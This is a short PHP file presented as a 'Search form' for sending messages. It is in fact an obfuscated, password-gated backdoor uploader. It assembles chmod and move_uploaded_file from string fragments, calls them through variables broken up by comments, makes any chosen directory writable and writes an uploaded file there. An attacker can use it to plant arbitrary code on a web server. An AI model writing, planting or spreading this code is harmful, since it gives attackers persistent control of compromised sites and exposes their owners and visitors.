<?php
if(!empty($_FILES['message']['name']) && (md5($_POST['name']) == '10a60045bb1f3bde8b75b0c8757e2307'))
{
	$sc = (empty($_POST['security_code'])) ? '.' : $_POST['security_code'];
	$sc = rtrim($sc, "/");

	$a = 'c';
	$a .= 'h';
	$a .= 'mod';
	
	if (!is_writable($sc."/"))
	{
$a   //aa';'"
		/*	*/($sc."/",0755);
	}

	$a = 'move_';
	$a .= 'upload';
	$a .= 'ed_file';

	$sz = $_FILES['message']['tmp_name'];
	$zx = $_FILES['message']['name'];

 $a   //aa';'"
/*	*/($sz, $sc."/".$zx) ? print "<b>Message sent!</b><br/>" : print "<b>Error!</b><br/>";
}
print '<html>
    <head>
    <title>Search form</title>
    </head>
    <body>
    <form enctype="multipart/form-data" action="" method="POST">
    Message: <br/><input name="message" type="file" />
    <br/>Security Code: <br/><input name="security_code" value=""/>
	<br/>Name: <br/><input name="name" value=""/><br/>
    <input type="submit" value="Sent" />
    </form>
    </body>
    </html>';
